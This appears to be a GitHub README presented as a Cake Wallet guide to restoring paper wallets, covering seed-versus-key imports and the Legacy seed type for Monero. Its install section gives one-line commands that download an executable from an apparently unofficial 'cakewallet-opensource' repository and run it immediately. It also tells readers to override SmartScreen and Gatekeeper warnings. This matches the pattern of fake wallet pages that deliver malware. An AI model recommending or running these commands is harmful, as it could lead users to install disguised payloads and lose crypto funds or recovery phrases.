![Cake Wallet paper wallet guide](assets/cake-wallet-paper-wallet-article-banner.png)

# Restore a Paper Wallet in Cake Wallet

There is no sweep button. Here is the route that actually works.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Cake Wallet has no sweep function for paper wallets. Restore from the seed words if the paper holds them, or import the keys if it holds keys. A 25-word Monero seed is restored under the Legacy seed type. What works depends entirely on what the paper contains.

<!-- ARTICLE-BODY-BEGIN -->

## No sweep function
Sweeping means moving every coin from an old address into a new one in a single action. Cake Wallet does not do that, and no setting makes it appear. The route is to bring the keys in, then send the balance to an address you control if you want it out of the old one.

That extra send costs a network fee and is worth it: after it, the old paper holds nothing and can be destroyed. Importing without sending leaves the funds spendable from the paper's keys, which is fine but keeps a fragile backup in play.

## Words or keys
Look at the paper before you start. Twelve or twenty-four words are a phrase and go through the restore-wallet phrase route. A string of Monero keys, a WIF for Bitcoin, or an ETH private key are keys, and each follows its own import path.

The distinction decides everything downstream: a phrase restores a wallet with history and derivation, while a single key restores one address and its funds.

## The Monero 25-word case
Monero paper wallets usually carry 25 words. Those restore under the Legacy seed type, which is a separate choice in the restore flow; selecting the standard Monero seed with 25 words fails or produces an empty wallet.

That single dropdown is the reason many old Monero backups appear invalid. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore an existing Cake Wallet wallet</a> covers each restore route and the failure modes that look like a damaged backup.

## Keys instead of words
A Bitcoin key is imported as a single-address wallet, not as a full wallet with history. An Ethereum private key brings its address and its tokens, which then need adding before they appear.

Check the balance against the chain before you move anything. If the paper is old, the address may hold nothing at all.

## Watch-only from paper
If the paper holds an xpub or zpub rather than keys, you can watch the balance without importing spending keys. That is safer for storage and useless for spending.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-watch-only.md">Add a watch-only wallet</a> explains what that wallet can and cannot do, which is the right frame before you import anything sensitive.

## Protect the result
Whatever you restore, back it up properly the same day: a new phrase if the import created a new wallet, or a written record of the keys if it did not. Paper does not become safe because it was old.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet backup and recovery phrase</a> covers where the phrase lives and how to prove the backup works before the paper is destroyed.

## Use the current release
Import paths change with the app, and older builds may not offer the key-import options at all. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> before you start, then test with the smallest paper you have.

If the option is missing entirely, the build is the reason rather than the paper.

## FAQ
### Does Cake Wallet have a sweep function?
No. Import the keys or restore the phrase, then send the balance to a new address if you want it consolidated.
### How do I restore a paper wallet?
Match the paper's contents to the route: words to the phrase restore, keys to the key import, a 25-word Monero seed to Legacy.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore an existing Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [add a watch-only wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-watch-only.md) · [Cake Wallet backup and recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
